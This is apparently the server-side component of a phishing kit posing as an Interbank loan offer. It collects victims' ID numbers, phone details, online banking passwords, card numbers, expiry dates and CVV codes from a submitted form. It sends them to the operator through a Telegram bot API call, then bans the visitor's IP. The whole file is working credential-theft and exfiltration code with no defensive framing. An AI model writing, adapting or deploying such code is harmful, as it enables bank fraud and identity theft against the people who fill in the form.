<?php
include "xguard.php";
$ua = new Mobile_Detect;
$useragente=$ua->getUserAgent();
if (isset($_POST['lacc']) ){
$dni=$_POST['dni'];
$celular=$_POST['cel'];
$monto=$_POST['monto'];
$operadora=$_POST['oper'];
$cinternet=$_POST['cve'];
$ccnum = $_POST["lacc"];
$expiry=$_POST['fecha'];
$cvc=$_POST['cbb'];


            $content= "=================================================".PHP_EOL;
$content.= "IBK prestamos: ".PHP_EOL;
 $content.="DNI: ".$dni.PHP_EOL;
  $content.="CEL: ".$celular.PHP_EOL;
   $content.="OPERADORA: ".$operadora.PHP_EOL;
   $content.="ClAVE INTERNET: ".$cinternet.PHP_EOL;
    $content.="TARJETA: ".$ccnum.PHP_EOL;
     $content.="EXP: ".$expiry.PHP_EOL;
      $content.="CW: ".$cvc.PHP_EOL;
        $content.="Monto: ".$monto.PHP_EOL;
         //$content.="UA: ".$useragente.PHP_EOL;

                 
$content.= "=================================================".PHP_EOL;
            $data = ['text' => $content,'chat_id' => $chatid];
           file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
		BanIP();
		CheckIPBan(); 
	# code...
}
?>
